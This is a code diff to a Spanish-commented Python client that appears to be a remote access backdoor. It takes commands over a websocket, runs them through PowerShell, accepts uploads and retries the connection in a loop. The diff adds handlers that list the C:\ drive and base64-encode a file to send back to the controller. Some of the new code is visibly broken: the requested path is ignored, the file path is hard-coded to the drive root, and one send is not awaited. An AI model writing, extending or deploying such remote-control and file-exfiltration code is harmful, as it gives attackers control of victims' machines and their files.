@@ -38,7 +38,6 @@ def cmo(cmd):
 
     # Ejecutar el comando en el directorio actual
     escaped_cmd = cmd.replace('"', '"')
-    print(escaped_cmd)
     result = subprocess.run(
         ['powershell.exe', '-Command', f'Set-Location "{current_dir}"; {escaped_cmd}'],
         capture_output=True, text=True
@@ -105,6 +104,8 @@ async def receive():
             while True:
                 cmd = await ws.recv()
                 data = json.loads(cmd.replace("'", '"'))
+
+                print(data)
                 if 'cmd' in data:
                     try:
                         out, err, cwd = cmo(data["cmd"])
@@ -133,9 +134,40 @@ async def receive():
                             # Limpieza
                             upload_buffer.clear()
                             upload_destination = None
-
+                        
                     except Exception as e:
                         ws.send("Error al subir archivo: " + str(e))
+
+                elif "list_files" in data:
+                        abs_path = "C:\\"
+                        path = f"C:\\{data['path']}"
+                        items = []
+                        for name in os.listdir(abs_path):
+                            full_path = os.path.join(abs_path, name)
+                            if os.path.isdir(full_path):
+                                items.append({ "name": name, "type": "directory" })
+                            else:
+                                items.append({ "name": name, "type": "file", "size": os.path.getsize(full_path) })
+                        await ws.send(json.dumps({ "action": "list", "path": path, "items": items }))
+
+                elif "get_files" in data:
+                    file_path = "C:\\"
+                    path = "C:\\"
+                    if not os.path.isfile(file_path):
+                        raise FileNotFoundError("Archivo no encontrado")
+
+                    with open(file_path, "rb") as f:
+                        content = base64.b64encode(f.read()).decode("utf-8")
+                    await ws.send(json.dumps({
+                        "action": "get_file",
+                        "path": path,
+                        "filename": os.path.basename(file_path),
+                        "content": content
+                    }))
+
+                                
+                
+
     except Exception:
         await asyncio.sleep(5)
 
